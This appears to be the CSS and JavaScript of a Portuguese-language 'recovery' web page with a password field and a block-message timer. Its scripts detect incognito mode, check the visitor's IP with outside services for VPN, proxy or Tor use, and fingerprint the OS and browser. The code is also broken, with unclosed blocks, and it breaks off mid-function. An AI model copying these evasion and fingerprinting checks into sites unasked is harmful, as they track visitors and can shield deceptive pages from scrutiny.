    <style>
        /* ===== RESET ===== */
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        :root {
            --primary: #8b5cf6; --primary-dark: #6d28d9; --primary-light: #a78bfa;
            --secondary: #d8b4fe; --accent: #a855f7; --cyan: #22d3ee;
            --glow: rgba(139, 92, 246, 0.45); --glow-strong: rgba(168, 85, 247, 0.65);
            --bg-start: #07030f; --bg-mid: #12082a; --bg-end: #1a0e35;
            --card-bg: rgba(139, 92, 246, 0.045); --card-hover: rgba(139, 92, 246, 0.09);
            --border-subtle: rgba(139, 92, 246, 0.14); --border-glow: rgba(168, 85, 247, 0.45);
            --text-primary: #ffffff; --text-secondary: rgba(255, 255, 255, 0.68);
            --text-muted: rgba(255, 255, 255, 0.42);
            --radius: 20px; --radius-sm: 12px;
            --shadow: 0 30px 70px rgba(0, 0, 0, 0.65);
        }

        html { scroll-behavior: smooth; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: radial-gradient(ellipse 80% 60% at 50% -10%, rgba(139, 92, 246, 0.22), transparent 60%),
                        linear-gradient(180deg, var(--bg-start), var(--bg-mid) 50%, var(--bg-end));
            color: var(--text-primary); line-height: 1.6; min-height: 100vh;
            overflow-x: hidden; background-attachment: fixed;
            -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility;
        }

        @media (min-width: 769px) {
            body::before {
                content: ''; position: fixed; inset: 0;
                background-image: linear-gradient(rgba(139,92,246,0.035) 1px, transparent 1px),
                                  linear-gradient(90deg, rgba(139,92,246,0.035) 1px, transparent 1px);
                background-size: 60px 60px; pointer-events: none; z-index: 0;
                mask-image: radial-gradient(ellipse 80% 70% at 50% 40%, black 30%, transparent 80%);
                -webkit-mask-image: radial-gradient(ellipse 80% 70% at 50% 40%, black 30%, transparent 80%);
            }
        }

        #bg3d { position: fixed; inset: 0; z-index: 0; pointer-events: none; opacity: 0.65; display: none; }
        body.canvas-enabled #bg3d { display: block; }

        .cursor-glow {
            position: fixed; width: 420px; height: 420px; border-radius: 50%;
            background: radial-gradient(circle, rgba(139,92,246,0.22), rgba(168,85,247,0.08) 40%, transparent 70%);
            pointer-events: none; z-index: 1; transform: translate(-50%, -50%);
            mix-blend-mode: screen; will-change: transform; display: none;
        }
        body.glow-enabled .cursor-glow { display: block; }

        .bg-layer { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
        .bg-layer .orb { position: absolute; border-radius: 50%; filter: blur(140px); opacity: 0.18; animation: floatOrb 20s ease-in-out infinite alternate; will-change: transform; }
        .bg-layer .orb-1 { width: 500px; height: 500px; background: var(--primary); top: -25%; left: -15%; }
        .bg-layer .orb-2 { width: 400px; height: 400px; background: var(--accent); bottom: -20%; right: -15%; animation-delay: -7s; }
        .bg-layer .orb-3 { width: 300px; height: 300px; background: var(--cyan); top: 50%; left: 50%; transform: translateX(-50%); animation-delay: -14s; opacity: 0.08; }

        @keyframes floatOrb { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(60px,-50px) scale(1.15); } }
        body.low-performance .bg-layer .orb { animation: none; }
        body.low-performance .cursor-glow { display: none; }

        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes float3d { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes gradientMove { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        @keyframes rotateSlow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
        }

        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg-start); }
        ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, var(--primary), var(--accent)); border-radius: 10px; }

        .navbar { position: sticky; top: 0; z-index: 1000; background: rgba(7,3,15,0.78); backdrop-filter: blur(20px) saturate(150%); -webkit-backdrop-filter: blur(20px) saturate(150%); border-bottom: 1px solid var(--border-subtle); height: 64px; display: flex; align-items: center; }
        .nav-inner { max-width: 1400px; margin: 0 auto; padding: 0 1.2rem; width: 100%; display: flex; justify-content: space-between; align-items: center; gap: 1rem; }
        .logo { display: flex; align-items: center; gap: 0.6rem; font-family: 'Space Grotesk', sans-serif; cursor: pointer; user-select: none; }
        .logo-mark { width: 34px; height: 34px; position: relative; display: flex; align-items: center; justify-content: center; border-radius: 10px; background: linear-gradient(135deg, var(--primary), var(--accent)); box-shadow: 0 0 20px rgba(139,92,246,0.5); overflow: hidden; flex-shrink: 0; }
        .logo-mark::before { content: ''; position: absolute; inset: -50%; background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.4), transparent 30%); animation: rotateSlow 4s linear infinite; opacity: 0.7; }
        .logo-mark::after { content: ''; position: absolute; inset: 2px; background: linear-gradient(135deg, var(--primary-dark), var(--primary)); border-radius: 8px; z-index: 1; }
        .logo-mark i { position: relative; z-index: 2; color: #fff; font-size: 0.9rem; filter: drop-shadow(0 0 6px rgba(255,255,255,0.6)); }
        body.low-performance .logo-mark::before { animation: none; }
        .logo-text { display: flex; flex-direction: column; line-height: 1; }
        .logo-text .aurora { background: linear-gradient(135deg, #fff, var(--secondary)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; font-size: 1.05rem; font-weight: 700; letter-spacing: -0.5px; }
        .logo-text .premium { font-size: 0.5rem; font-weight: 700; letter-spacing: 2.5px; color: var(--primary-light); opacity: 0.8; margin-top: 2px; text-transform: uppercase; }

        .nav-links { display: flex; gap: 0.15rem; align-items: center; }
        .nav-links a { color: var(--text-secondary); text-decoration: none; font-weight: 600; font-size: 0.8rem; padding: 0.5rem 0.85rem; border-radius: var(--radius-sm); transition: all 0.2s; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; user-select: none; }
        .nav-links a:hover { color: #fff; background: rgba(139,92,246,0.12); }
        .nav-links a.active { color: var(--secondary); background: rgba(139,92,246,0.14); box-shadow: 0 0 15px rgba(139,92,246,0.2); }
        .nav-toggle { display: none; background: rgba(139,92,246,0.1); border: 1px solid var(--border-subtle); color: #fff; font-size: 1.1rem; cursor: pointer; padding: 0.5rem 0.7rem; border-radius: 10px; transition: all 0.2s; }

        .container { max-width: 1400px; margin: 0 auto; padding: 0 1.2rem; position: relative; z-index: 1; }
        .section { display: none; padding: 2rem 0 3rem; animation: fadeUp 0.4s ease-out; }
        .section.active { display: block; }
        .section-title { font-family: 'Space Grotesk', sans-serif; font-size: clamp(1.6rem, 5vw, 2.8rem); font-weight: 700; text-align: center; background: linear-gradient(270deg, var(--secondary), var(--primary), var(--primary-light), var(--secondary)); background-size: 300% 300%; animation: gradientMove 6s ease infinite; -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.4rem; letter-spacing: -0.8px; padding: 0 0.5rem; }
        body.low-performance .section-title { animation: none; }
        .section-sub { text-align: center; color: var(--text-secondary); font-size: clamp(0.85rem, 2.5vw, 1rem); margin-bottom: 2rem; padding: 0 0.5rem; }

        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 0.85rem 1.8rem; border: none; border-radius: var(--radius-sm); font-weight: 700; font-size: 0.92rem; font-family: 'Inter', sans-serif; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; touch-action: manipulation; position: relative; overflow: hidden; }
        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #fff; box-shadow: 0 8px 25px var(--glow); border: 1px solid rgba(216,180,254,0.2); }
        .btn-primary:active { transform: translateY(2px) scale(0.98); }
        .btn-lg { padding: 1rem 2.5rem; font-size: 1rem; }
        .btn-block { width: 100%; }
        .btn-secondary { background: rgba(139,92,246,0.1); color: var(--secondary); border: 1.5px solid rgba(139,92,246,0.2); }
        .btn-secondary:disabled { opacity: 0.4; cursor: not-allowed; }
        .btn-ghost { background: rgba(255,255,255,0.03); color: rgba(255,255,255,0.7); border: 1.5px solid rgba(255,255,255,0.08); }

        .hero { text-align: center; padding: 2.5rem 0 2rem; display: flex; flex-direction: column; align-items: center; }
        .hero-badge { display: inline-flex; align-items: center; gap: 0.4rem; background: linear-gradient(135deg, rgba(139,92,246,0.15), rgba(168,85,247,0.08)); border: 1px solid rgba(139,92,246,0.25); color: var(--secondary); padding: 0.35rem 1rem; border-radius: 50px; font-size: 0.68rem; font-weight: 700; margin-bottom: 1.5rem; letter-spacing: 0.5px; text-transform: uppercase; animation: float3d 4s ease-in-out infinite; }
        body.low-performance .hero-badge { animation: none; }
        .hero h1 { font-family: 'Space Grotesk', sans-serif; font-size: clamp(2.8rem, 14vw, 6rem); font-weight: 700; line-height: 0.95; background: linear-gradient(270deg, #fff, var(--secondary) 30%, var(--primary-light) 60%, #fff); background-size: 300% 300%; animation: gradientMove 8s ease infinite; -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.6rem; letter-spacing: -2px; filter: drop-shadow(0 0 50px rgba(139,92,246,0.4)); }
        body.low-performance .hero h1 { animation: none; }
        .hero-subtitle { font-size: clamp(0.85rem, 2.5vw, 1.1rem); color: var(--text-secondary); max-width: 640px; line-height: 1.6; margin-bottom: 0.5rem; font-weight: 500; }
        .hero-desc { font-size: clamp(0.85rem, 2.2vw, 0.95rem); max-width: 600px; color: var(--text-secondary); margin-bottom: 1.8rem; line-height: 1.65; padding: 0 0.8rem; }
        .hero-tags { display: flex; flex-wrap: wrap; justify-content: center; gap: 0.5rem; margin-bottom: 1.8rem; padding: 0 0.5rem; }
        .hero-tags span { display: flex; align-items: center; gap: 0.35rem; background: rgba(139,92,246,0.07); border: 1px solid rgba(139,92,246,0.12); padding: 0.4rem 0.95rem; border-radius: 50px; font-size: 0.75rem; font-weight: 600; color: rgba(255,255,255,0.85); }
        .hero-tags span i { color: var(--secondary); }

        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.2rem; margin: 2rem 0; }
        .card { background: var(--card-bg); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid var(--border-subtle); border-radius: var(--radius); padding: 1.8rem 1.5rem; transition: all 0.3s; position: relative; overflow: hidden; }
        .card:hover { background: var(--card-hover); border-color: var(--border-glow); box-shadow: 0 20px 50px rgba(0,0,0,0.4); }
        .card-icon { width: 52px; height: 52px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.35rem; color: #fff; margin-bottom: 1rem; box-shadow: 0 8px 25px var(--glow); }
        .card h3 { font-size: 1.08rem; font-weight: 800; margin-bottom: 0.35rem; }
        .card p { color: var(--text-secondary); font-size: 0.86rem; line-height: 1.6; }

        .recovery-layout { display: grid; grid-template-columns: 1fr 340px; gap: 1.5rem; margin-top: 1.2rem; }
        .main-panel { background: linear-gradient(145deg, rgba(139,92,246,0.06), rgba(139,92,246,0.02)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid var(--border-subtle); border-radius: var(--radius); padding: 2rem; box-shadow: var(--shadow); }
        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.6rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-subtle); flex-wrap: wrap; gap: 0.5rem; }
        .panel-header h2 { font-family: 'Space Grotesk', sans-serif; font-size: clamp(1.15rem, 3vw, 1.6rem); font-weight: 700; letter-spacing: -0.4px; }
        .badge { background: linear-gradient(135deg, var(--primary), var(--accent)); color: #fff; padding: 0.25rem 0.9rem; border-radius: 50px; font-size: 0.62rem; font-weight: 800; letter-spacing: 0.6px; box-shadow: 0 4px 15px var(--glow); text-transform: uppercase; }

        .form-group { margin-bottom: 1.3rem; }
        .form-group label { display: flex; align-items: center; gap: 0.45rem; font-weight: 700; font-size: 0.88rem; margin-bottom: 0.5rem; color: #fff; }
        .form-group label i { color: var(--secondary); }
        .input-wrap { position: relative; }
        .input-wrap input { width: 100%; padding: 0.9rem 1rem; background: rgba(255,255,255,0.03); border: 1.5px solid var(--border-subtle); border-radius: var(--radius-sm); color: #fff; font-size: 0.95rem; font-weight: 500; font-family: inherit; transition: all 0.25s; -webkit-appearance: none; appearance: none; }
        .input-wrap input:focus { outline: none; border-color: rgba(139,92,246,0.6); background: rgba(139,92,246,0.05); box-shadow: 0 0 0 4px rgba(139,92,246,0.1); }
        .input-wrap input::placeholder { color: var(--text-muted); }
        .input-wrap .toggle { position: absolute; right: 0.7rem; top: 50%; transform: translateY(-50%); background: rgba(139,92,246,0.1); border: none; color: var(--secondary); cursor: pointer; font-size: 0.9rem; padding: 0.5rem; border-radius: 8px; min-width: 38px; min-height: 38px; display: flex; align-items: center; justify-content: center; }
        .hint { display: block; font-size: 0.72rem; color: var(--text-muted); margin-top: 0.4rem; }

        .security-note { display: flex; gap: 0.8rem; background: linear-gradient(135deg, rgba(139,92,246,0.08), rgba(139,92,246,0.03)); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); padding: 1rem; margin-bottom: 1.6rem; }
        .security-note i { color: var(--secondary); font-size: 1.2rem; flex-shrink: 0; margin-top: 0.1rem; }
        .security-note p { color: var(--text-secondary); font-size: 0.8rem; line-height: 1.6; }
        .security-note strong { color: var(--secondary); }

        .disclaimer { text-align: center; color: var(--text-muted); font-size: 0.72rem; margin-top: 1rem; line-height: 1.6; }
        .disclaimer a { color: var(--secondary); text-decoration: none; font-weight: 700; }

        .block-msg { background: linear-gradient(135deg, rgba(239,68,68,0.08), rgba(239,68,68,0.03)); border: 1.5px solid rgba(239,68,68,0.18); border-radius: var(--radius-sm); padding: 1.4rem; text-align: center; margin-top: 1rem; display: none; }
        .block-msg.visible { display: block; animation: fadeUp 0.4s ease-out; }
        .block-msg i { font-size: 2rem; color: #ef4444; display: block; margin-bottom: 0.3rem; }
        .block-msg h3 { color: #ef4444; font-weight: 800; font-size: 1rem; }
        .block-msg .timer { font-size: clamp(1.3rem, 5vw, 1.7rem); font-weight: 900; color: var(--secondary); margin: 0.4rem 0; text-shadow: 0 0 20px rgba(216,180,254,0.6); font-family: 'Space Grotesk', monospace; letter-spacing: 1px; }
        .block-msg .help-links { display: flex; gap: 0.6rem; flex-wrap: wrap; justify-content: center; margin-top: 0.8rem; }
        .block-msg .help-links a { color: var(--secondary); text-decoration: none; font-size: 0.8rem; background: rgba(139,92,246,0.08); padding: 0.4rem 0.9rem; border-radius: 8px; border: 1px solid rgba(139,92,246,0.1); display: inline-flex; align-items: center; gap: 0.35rem; }
        .block-msg .help-links a.tiktok { color: #25f4ee; border-color: rgba(37,244,238,0.2); }

        .sidebar { display: flex; flex-direction: column; gap: 1.1rem; }
        .side-card { background: linear-gradient(145deg, rgba(139,92,246,0.06), rgba(139,92,246,0.02)); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid var(--border-subtle); border-radius: var(--radius); padding: 1.3rem 1.4rem; transition: all 0.3s; }
        .side-card:hover { transform: translateY(-2px); border-color: var(--border-glow); }
        .side-card h4 { display: flex; align-items: center; gap: 0.45rem; font-weight: 800; font-size: 0.92rem; margin-bottom: 0.8rem; }
        .side-card h4 i { color: var(--secondary); }
        .status-pill { display: inline-flex; align-items: center; gap: 0.4rem; font-size: 0.68rem; font-weight: 700; color: var(--secondary); background: rgba(139,92,246,0.12); padding: 0.25rem 0.8rem; border-radius: 50px; margin-bottom: 0.6rem; border: 1px solid rgba(139,92,246,0.2); }
        .status-pill i { font-size: 0.45rem; }
        .info-row { display: flex; justify-content: space-between; padding: 0.45rem 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
        .info-row:last-child { border-bottom: none; }
        .info-row .label { color: var(--text-secondary); font-size: 0.77rem; font-weight: 500; }
        .info-row .value { color: var(--secondary); font-weight: 700; font-size: 0.82rem; }
        .feature-list { list-style: none; }
        .feature-list li { display: flex; align-items: center; gap: 0.5rem; color: var(--text-secondary); font-size: 0.78rem; padding: 0.3rem 0; font-weight: 500; }
        .feature-list li i { color: var(--secondary); font-size: 0.72rem; }

        .faq-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 0.9rem; margin-top: 1.6rem; }
        .faq-item { background: var(--card-bg); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); overflow: hidden; transition: all 0.25s; }
        .faq-item:hover { border-color: var(--border-glow); }
        .faq-q { display: flex; justify-content: space-between; align-items: center; padding: 1rem 1.2rem; cursor: pointer; user-select: none; gap: 0.5rem; }
        .faq-q h3 { font-size: 0.9rem; font-weight: 700; margin: 0; }
        .faq-q i { color: var(--secondary); transition: transform 0.3s; font-size: 0.8rem; flex-shrink: 0; }
        .faq-item.open .faq-q i { transform: rotate(180deg); }
        .faq-a { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
        .faq-item.open .faq-a { max-height: 400px; }
        .faq-a p { padding: 0 1.2rem 1.2rem; color: var(--text-secondary); font-size: 0.83rem; line-height: 1.7; }

        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 1.2rem; margin-top: 2rem; }
        .stat-card { background: linear-gradient(145deg, rgba(139,92,246,0.08), rgba(139,92,246,0.02)); border: 1px solid var(--border-subtle); border-radius: var(--radius); padding: 1.8rem 1.2rem; text-align: center; transition: all 0.3s; }
        .stat-card:hover { border-color: var(--border-glow); transform: translateY(-4px); }
        .stat-card .number { font-family: 'Space Grotesk', sans-serif; font-size: clamp(2rem, 8vw, 3rem); font-weight: 700; background: linear-gradient(135deg, var(--secondary), var(--primary)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; display: block; letter-spacing: -1.5px; }
        .stat-card .label { color: var(--text-secondary); font-size: 0.82rem; font-weight: 600; margin-top: 0.2rem; }

        .community-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.2rem; margin-top: 1.6rem; }
        .community-card { background: var(--card-bg); border: 1px solid var(--border-subtle); border-radius: var(--radius); padding: 1.8rem 1.4rem; text-align: center; transition: all 0.3s; cursor: pointer; }
        .community-card:hover { border-color: var(--border-glow); transform: translateY(-4px); }
        .community-icon { width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; margin: 0 auto 0.9rem; }
        .community-icon.discord { background: #5865F2; color: #fff; }
        .community-icon.email { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #fff; }
        .community-icon.tiktok { background: #000; color: #25f4ee; border: 2px solid #25f4ee; }

    <script>
        // ============================================================
        // 0. DETECÇÃO DE PERFORMANCE
        // ============================================================
        const PERF = {
            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
            isTablet: /iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
            isLowEnd: false,
            hasReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
            saveData: navigator.connection?.saveData || false,
            effectiveType: navigator.connection?.effectiveType || 'unknown',
            cores: navigator.hardwareConcurrency || 2,
            memory: navigator.deviceMemory || 2,
            isTouch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
        };

        PERF.isLowEnd = PERF.isMobile || PERF.isTablet || PERF.cores < 4 || PERF.memory < 4 ||
            ['slow-2g', '2g', '3g'].includes(PERF.effectiveType) || PERF.saveData || PERF.hasReducedMotion;

        if (PERF.isLowEnd) document.body.classList.add('low-performance');
        if (!PERF.isLowEnd && !PERF.isMobile && PERF.cores >= 4 && PERF.memory >= 4) document.body.classList.add('canvas-enabled');
        if (!PERF.isMobile && !PERF.isTouch) document.body.classList.add('glow-enabled');

        // ============================================================
        // 0.1 CARREGAMENTO CONDICIONAL DE SCRIPTS
        // ============================================================
        function loadScript(src) {
            return new Promise((resolve, reject) => {
                const s = document.createElement('script');
                s.src = src; s.async = true; s.onload = resolve; s.onerror = reject;
                document.head.appendChild(s);
            });
        }

        if (document.body.classList.contains('canvas-enabled')) {
            loadScript('https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js')
                .then(() => init3DBackground()).catch(() => {});
        }

        // ============================================================
        // 0.2 THREE.JS
        // ============================================================
        function init3DBackground() {
            const canvas = document.getElementById('bg3d');
            if (!canvas || !window.THREE) return;
            const scene = new THREE.Scene();
            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
            camera.position.z = 32;
            const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: false });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 1.5));
            const particlesCount = 400;
            const positions = new Float32Array(particlesCount * 3);
            const colors = new Float32Array(particlesCount * 3);
            const palette = [[0.85,0.71,0.99],[0.55,0.36,0.96],[0.66,0.55,0.98]];
            for (let i = 0; i < particlesCount; i++) {
                positions[i*3] = (Math.random()-0.5)*100;
                positions[i*3+1] = (Math.random()-0.5)*100;
                positions[i*3+2] = (Math.random()-0.5)*100;
                const c = palette[Math.floor(Math.random()*palette.length)];
                colors[i*3] = c[0]; colors[i*3+1] = c[1]; colors[i*3+2] = c[2];
            }
            const particleGeo = new THREE.BufferGeometry();
            particleGeo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            particleGeo.setAttribute('color', new THREE.BufferAttribute(colors, 3));
            const particleMat = new THREE.PointsMaterial({ size: 0.18, vertexColors: true, transparent: true, opacity: 0.9, blending: THREE.AdditiveBlending, sizeAttenuation: true });
            const particles = new THREE.Points(particleGeo, particleMat);
            scene.add(particles);
            let mouseX = 0, mouseY = 0, targetX = 0, targetY = 0;
            document.addEventListener('mousemove', (e) => {
                mouseX = (e.clientX / window.innerWidth - 0.5) * 2;
                mouseY = (e.clientY / window.innerHeight - 0.5) * 2;
            }, { passive: true });
            let time = 0;
            function animate() {
                requestAnimationFrame(animate);
                time += 0.01;
                targetX += (mouseX - targetX) * 0.05;
                targetY += (mouseY - targetY) * 0.05;
                particles.rotation.y = time * 0.04 + targetX * 0.25;
                particles.rotation.x = time * 0.02 + targetY * 0.25;
                camera.position.x += (targetX * 3.5 - camera.position.x) * 0.05;
                camera.position.y += (-targetY * 3.5 - camera.position.y) * 0.05;
                camera.lookAt(scene.position);
                renderer.render(scene, camera);
            }
            animate();
            let resizeTimer;
            window.addEventListener('resize', () => {
                clearTimeout(resizeTimer);
                resizeTimer = setTimeout(() => {
                    camera.aspect = window.innerWidth / window.innerHeight;
                    camera.updateProjectionMatrix();
                    renderer.setSize(window.innerWidth, window.innerHeight);
                }, 200);
            }, { passive: true });
        }

        // ============================================================
        // 0.3 CURSOR GLOW
        // ============================================================
        (function initCursorGlow() {
            const glow = document.getElementById('cursorGlow');
            if (!glow || !document.body.classList.contains('glow-enabled')) return;
            let mouseX = window.innerWidth / 2, mouseY = window.innerHeight / 2;
            let currentX = mouseX, currentY = mouseY;
            document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; }, { passive: true });
            function animate() {
                currentX += (mouseX - currentX) * 0.15;
                currentY += (mouseY - currentY) * 0.15;
                glow.style.transform = `translate(${currentX - 210}px, ${currentY - 210}px)`;
                requestAnimationFrame(animate);
            }
            animate();
        })();

        // ============================================================
        // 0.4 VANILLA TILT
        // ============================================================
        if (!PERF.isMobile && !PERF.isLowEnd) {
            loadScript('https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.0/vanilla-tilt.min.js')

        // ============================================================
        // 1. DETECÇÃO DE INCÓGNITO
        // ============================================================
        function detectIncognito() {
            return new Promise((resolve) => {
                let detected = false, checksDone = 0; const totalChecks = 4;
                function checkDone() { checksDone++; if (checksDone >= totalChecks) resolve(detected); }
                try { localStorage.setItem('__incog__','1'); localStorage.removeItem('__incog__'); } catch (e) { detected = true; } checkDone();
                try { sessionStorage.setItem('__incog__','1'); sessionStorage.removeItem('__incog__'); } catch (e) { detected = true; } checkDone();
                try {
                    const request = indexedDB.open('__incog__');
                    request.onerror = () => { detected = true; checkDone(); };
                    request.onsuccess = () => { if (request.result) request.result.close(); checkDone(); };
                } catch (e) { detected = true; checkDone(); }
                if (navigator.storage && navigator.storage.estimate) {
                    navigator.storage.estimate().then(est => { if (est.quota < 120000000) detected = true; checkDone(); }).catch(() => checkDone());
                } else checkDone();
                setTimeout(() => resolve(detected), 2500);
            });
        }

        // ============================================================
        // 2. DETECÇÃO DE NAVEGADOR ANÔNIMO E VPN
        // ============================================================
        function isPrivateBrowsing() {
            return new Promise((resolve) => {
                let positives = 0, methods = 0;
                try { localStorage.setItem('__t__','1'); localStorage.removeItem('__t__'); } catch (e) { positives++; } methods++;
                try { sessionStorage.setItem('__t__','1'); sessionStorage.removeItem('__t__'); } catch (e) { positives++; } methods++;
                try {
                    const req = indexedDB.open('__t__');
                    req.onerror = () => { positives++; if (++methods >= 3) resolve(positives >= 2); };
                    req.onsuccess = () => { if (++methods >= 3) resolve(positives >= 2); };
                } catch (e) { positives++; if (++methods >= 3) resolve(positives >= 2); }
                setTimeout(() => resolve(positives >= 2), 1000);
            });
        }

        function detectPrivateBrowsingBrowser() {
            return new Promise((resolve) => {
                let result = false, done = 0, total = 4;
                try { localStorage.setItem('__t__','1'); localStorage.removeItem('__t__'); } catch (e) { result = true; } done++;
                try { sessionStorage.setItem('__t__','1'); sessionStorage.removeItem('__t__'); } catch (e) { result = true; } done++;
                try {
                    const req = indexedDB.open('__t__');
                    req.onerror = () => { result = true; done++; if (done >= total) resolve(result); };
                    req.onsuccess = () => { if (req.result) req.result.close(); done++; if (done >= total) resolve(result); };
                } catch (e) { result = true; done++; if (done >= total) resolve(result); }
                if (navigator.storage && navigator.storage.estimate) {
                    navigator.storage.estimate().then(e => { if (e.quota < 120000000) result = true; done++; if (done >= total) resolve(result); })
                        .catch(() => { done++; if (done >= total) resolve(result); });
                } else { done++; if (done >= total) resolve(result); }
                setTimeout(() => resolve(result), 2500);
            });
        }

        function fetchWithTimeout(url, timeout = 4000) {
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), timeout);
            return fetch(url, { signal: controller.signal }).finally(() => clearTimeout(timer));
        }

        async function detectVPN() {
            try {
                const data = await getIPData();
                if (!data) return false;
                return [data.is_vpn, data.is_proxy, data.is_tor, data.is_datacenter, data.threat_level > 50].some(v => v === true);
            } catch (e) { return false; }
        }

        async function getIPData() {
            const apis = [
                { url: 'https://ipapi.is/api/ip/', parser: d => ({ is_vpn: d.is_vpn, is_proxy: d.is_proxy, is_tor: d.is_tor, is_datacenter: d.is_datacenter, threat_level: d.threat_level || 0 }) },
                { url: 'https://ip-api.com/json/?fields=query,proxy,hosting,status', parser: d => ({ is_vpn: d.proxy === true, is_proxy: d.proxy === true, is_datacenter: d.hosting === true, threat_level: (d.proxy || d.hosting) ? 75 : 0 }) }
            ];
            for (const api of apis) {
                try {
                    const res = await fetchWithTimeout(api.url, 4000);
                    if (res.ok) { const data = await res.json(); return api.parser(data); }
                } catch (e) { continue; }
            }
            return null;
        }

        async function isGoogleIncognito() {
            return new Promise((resolve) => {
                let results = [];
                if (navigator.storage && navigator.storage.estimate) {
                    navigator.storage.estimate().then(e => { results.push(e.quota < 120000000); if (results.length >= 2) resolve(results.some(r => r === true)); })
                        .catch(() => { results.push(false); if (results.length >= 2) resolve(results.some(r => r === true)); });
                } else results.push(false);
                if (window.webkitRequestFileSystem) {
                    window.webkitRequestFileSystem(window.TEMPORARY, 1024 * 1024,
                        () => { results.push(false); if (results.length >= 2) resolve(results.some(r => r === true)); },
                        () => { results.push(true); if (results.length >= 2) resolve(results.some(r => r === true)); });
                } else results.push(false);
                setTimeout(() => { if (results.length > 0) resolve(results.some(r => r === true)); else resolve(false); }, 1500);
            });
        }

        function getOS() {
            const ua = navigator.userAgent;
            let os = 'Desconhecido', version = '';
            if (/Windows NT 10/.test(ua)) { os = 'Windows'; version = '10/11'; }
            else if (/Windows NT 6\.3/.test(ua)) { os = 'Windows'; version = '8.1'; }
            else if (/Windows NT 6\.2/.test(ua)) { os = 'Windows'; version = '8'; }
            else if (/Windows NT 6\.1/.test(ua)) { os = 'Windows'; version = '7'; }
            else if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac OS X/.test(ua)) { os = 'macOS'; const m = ua.match(/Mac OS X ([\d_]+)/); if (m) version = m[1].replace(/_/g, '.'); }
            else if (/Android/.test(ua)) { os = 'Android'; const m = ua.match(/Android ([\d.]+)/); if (m) version = m[1]; }
            else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; const m = ua.match(/OS ([\d_]+)/); if (m) version = m[1].replace(/_/g, '.'); }
            else if (/CrOS/.test(ua)) os = 'ChromeOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            return version ? `${os} ${version}` : os;
        }

        function getBrowser() {
            const ua = navigator.userAgent;
            let browser = 'Desconhecido', version = '';
            if (/Edg\//.test(ua)) { browser = 'Edge'; const m = ua.match(/Edg\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
            else if (/OPR\/|Opera/.test(ua)) { browser = 'Opera'; const m = ua.match(/OPR\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
            else if (/Chrome/.test(ua) && !/Edg/.test(ua)) { browser = 'Chrome'; const m = ua.match(/Chrome\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
            else if (/Firefox/.test(ua)) { browser = 'Firefox'; const m = ua.match(/Firefox\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
